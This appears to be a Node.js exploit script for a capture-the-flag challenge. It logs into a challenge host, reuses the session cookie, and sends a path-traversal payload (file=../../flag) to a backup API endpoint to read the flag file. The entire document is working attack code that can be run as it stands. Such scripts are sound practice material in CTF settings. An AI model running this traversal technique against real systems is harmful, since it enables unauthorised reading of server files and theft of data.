
const http = require('http');
const querystring = require('querystring');

const uid = "f5dbc9de539a43369524a3b9ed5a3aba";
const loginData = querystring.stringify({uid: uid});

const loginOpts = {
  hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
  port: 80,
  path: '/login',
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': Buffer.byteLength(loginData)
  }
};

console.log("Login...");
const req = http.request(loginOpts, (res) => {
  const cookie = res.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
  console.log("Got cookie, request backup: file=../../flag");
  const backupData = querystring.stringify({file: '../../flag'});
  const backupOpts = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/api/backup',
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': Buffer.byteLength(backupData),
      'Cookie': cookie
    }
  };

  const backupReq = http.request(backupOpts, (backupRes) => {
    let body = '';
    backupRes.on('data', chunk => body += chunk);
    backupRes.on('end', () => {
      console.log("\n🏁 RESULT:");
      console.log(body);
    });
  });
  backupReq.write(backupData);
  backupReq.end();
});

req.on('error', err => console.error(err));
req.write(loginData);
req.end();
